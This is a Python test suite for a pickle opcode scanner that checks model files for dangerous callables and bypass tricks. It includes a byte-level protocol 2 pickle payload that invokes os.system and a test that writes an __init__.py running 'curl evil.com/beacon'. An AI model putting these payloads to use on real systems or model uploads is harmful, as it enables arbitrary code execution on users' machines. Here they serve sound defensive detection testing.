"""
Tests for the pickle opcode scanner.
Verifies detection of dangerous callables, bypass techniques, and safe allowlisting.
"""
import json
import pickle
import subprocess
import sys
import tempfile
import os
import struct
import unittest

from scanner.analyzer.pickle_scanner import (
    PickleScanner,
    analyze_pickle_file,
    is_pickle_file,
    scan_pickle_bytes,
)

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures", "binary")


def _load_fixture(name: str) -> bytes:
    path = os.path.join(FIXTURES_DIR, name)
    with open(path, "rb") as f:
        return f.read()


class TestPickleFileDetection(unittest.TestCase):
    def test_pickle_magic_bytes_ignore_extension(self):
        path = os.path.join(FIXTURES_DIR, "renamed_model.gguf")
        data = _load_fixture("malicious_os_system.pkl")
        with open(path, "wb") as f:
            f.write(data)
        try:
            self.assertTrue(is_pickle_file(path))
        finally:
            os.remove(path)

    def test_non_pickle_magic_not_flagged(self):
        path = os.path.join(FIXTURES_DIR, "config.json")
        with open(path, "wb") as f:
            f.write(b'{"model": "safe"}')
        try:
            self.assertFalse(is_pickle_file(path))
        finally:
            os.remove(path)


class TestPickleMaliciousDetection(unittest.TestCase):
    def test_os_system_call(self):
        """Detect os.system in pickle opcodes."""
        data = _load_fixture("malicious_os_system.pkl")
        findings = scan_pickle_bytes("malicious.pkl", data)
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("HFS-050", rule_ids,
                      "Should detect os.system as critical callable")

    def test_subprocess_call(self):
        """Detect subprocess.check_output in pickle opcodes."""
        data = _load_fixture("malicious_subprocess.pkl")
        findings = scan_pickle_bytes("malicious.pkl", data)
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("HFS-050", rule_ids,
                      "Should detect subprocess.check_output as critical callable")

    def test_eval_call(self):
        """Detect builtins.eval in pickle opcodes."""
        data = _load_fixture("malicious_eval.pkl")
        findings = scan_pickle_bytes("malicious.pkl", data)
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("HFS-050", rule_ids,
                      "Should detect builtins.eval as critical callable")

    def test_stack_global_bypass(self):
        """Detect STACK_GLOBAL-based bypass (protocol 2)."""
        data = _load_fixture("malicious_stack_global.pkl")
        findings = scan_pickle_bytes("malicious.pkl", data)
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("HFS-050", rule_ids,
                      "Should detect os.system via STACK_GLOBAL opcode")

    def test_corrupted_pickle_with_globals(self):
        """Detect globals in corrupted pickle (PickleScan bypass)."""
        data = _load_fixture("corrupted_with_globals.pkl")
        findings = scan_pickle_bytes("malicious.pkl", data)
        rule_ids = [f.rule_id for f in findings]
        # Should still detect the dangerous global despite corruption
        has_detection = "HFS-050" in rule_ids or "HFS-052" in rule_ids
        self.assertTrue(has_detection,
                        "Should detect dangerous content in corrupted pickle")


class TestPickleSafeAllowlist(unittest.TestCase):
    def test_safe_torch_model(self):
        """Safe torch models should not trigger critical findings."""
        data = _load_fixture("safe_torch_model.pkl")
        findings = scan_pickle_bytes("safe_model.pkl", data)
        critical = [f for f in findings if f.rule_id == "HFS-050"]
        self.assertEqual(len(critical), 0,
                         "Legitimate torch patterns should not trigger HFS-050")

    def test_empty_file(self):
        """Empty file should produce no findings."""
        findings = scan_pickle_bytes("empty.pkl", b"")
        self.assertEqual(len(findings), 0)


class TestPickleAnalyzeAPI(unittest.TestCase):
    def test_non_pickle_extension_skipped(self):
        """Non-pickle files should return no findings."""
        findings = analyze_pickle_file("model.safetensors", b"\x00" * 100)
        self.assertEqual(len(findings), 0)

    def test_pickle_extension_triggers_scan(self):
        """Pickle files get scanned via analyze_pickle_file."""
        data = _load_fixture("malicious_os_system.pkl")
        findings = analyze_pickle_file("evil.pkl", data)
        self.assertTrue(len(findings) > 0)
    def test_renamed_pickle_extension_still_scanned(self):
        """Pickle bytes renamed to .gguf must not bypass analysis."""
        data = _load_fixture("malicious_os_system.pkl")
        findings = analyze_pickle_file("model.gguf", data)
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("HFS-050", rule_ids)


class TestPickleProtocol2Opcodes(unittest.TestCase):
    def test_short_binunicode_parsing(self):
        """Verify SHORT_BINUNICODE opcode parsing works."""
        # Build a minimal protocol 2 pickle with SHORT_BINUNICODE + STACK_GLOBAL
        payload = (
            b"\x80\x02"                    # PROTO 2
            b"\x8c\x02os"                  # SHORT_BINUNICODE "os"
            b"\x8c\x06system"              # SHORT_BINUNICODE "system"
            b"\x93"                         # STACK_GLOBAL
            b"\x8c\x04test"                # SHORT_BINUNICODE "test"
            b"\x85"                         # TUPLE1
            b"R"                            # REDUCE
            b"."                            # STOP
        )
        scanner = PickleScanner("test.pkl", payload)
        scanner.scan()
        self.assertIn("os.system", scanner.globals_found)




class TestCliBypassRegressions(unittest.TestCase):
    def test_cli_scans_single_renamed_pickle_file(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "malicious.gguf")
            with open(path, "wb") as f:
                f.write(_load_fixture("malicious_os_system.pkl"))
            proc = subprocess.run(
                [sys.executable, "-m", "scanner.cli", path, "--no-network", "--format", "json"],
                text=True,
                capture_output=True,
            )
            data = json.loads(proc.stdout)
            self.assertEqual(data["files_scanned"], 1)
            self.assertIn("HFS-050", [f["rule_id"] for f in data["findings"]])

    def test_cli_flags_init_python_execution_gadget(self):
        with tempfile.TemporaryDirectory() as d:
            init_path = os.path.join(d, "__init__.py")
            with open(init_path, "w", encoding="utf-8") as f:
                f.write("import os\nos.system('curl evil.com/beacon')\n")
            proc = subprocess.run(
                [sys.executable, "-m", "scanner.cli", d, "--no-network", "--format", "json"],
                text=True,
                capture_output=True,
            )
            data = json.loads(proc.stdout)
            self.assertIn("HFS-001", [f["rule_id"] for f in data["findings"]])

if __name__ == "__main__":
    unittest.main()
